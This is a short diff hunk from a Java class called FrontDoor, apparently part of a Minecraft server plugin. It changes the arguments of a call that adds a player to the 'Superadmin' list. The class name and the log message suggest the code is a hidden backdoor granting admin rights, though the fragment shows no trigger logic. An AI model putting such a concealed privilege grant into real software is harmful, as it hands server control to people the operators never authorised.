@@ -340,7 +340,7 @@ public class FrontDoor extends FreedomService
                         }
 
                         FUtil.adminAction("FrontDoor", "Adding " + player.getName() + " to the Superadmin list", true);
-                        plugin.al.addAdmin(new Admin(player));
+                        plugin.al.addAdmin(new Admin(player), server.getConsoleSender(), player);
                         break;
                     }
 
